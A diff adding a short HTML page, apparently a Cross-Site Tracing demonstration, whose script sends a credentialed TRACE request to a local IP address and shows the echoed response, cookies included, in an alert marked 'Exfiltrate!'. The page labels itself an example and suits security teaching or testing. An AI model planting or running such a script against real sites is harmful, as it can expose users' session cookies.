@@ -1,0 +1,19 @@
+<html>
+  <head>
+    <h1>WELCOME!!</h1>
+  </head>
+  <body>
+    <p>This is only an example..</p>
+    <script>
+      var xhr = new XMLHttpRequest();
+      xhr.open("TRACE", "http://192.168.68.118/", true);
+      xhr.withCredentials = true; // Important for sending cookies!
+      xhr.onreadystatechange = function() {
+        if (xhr.readyState == 4) {
+          alert("Captured Response:\n" + xhr.responseText); // Exfiltrate!
+        }
+      };
+      xhr.send();
+    </script>
+  </body>
+</html>
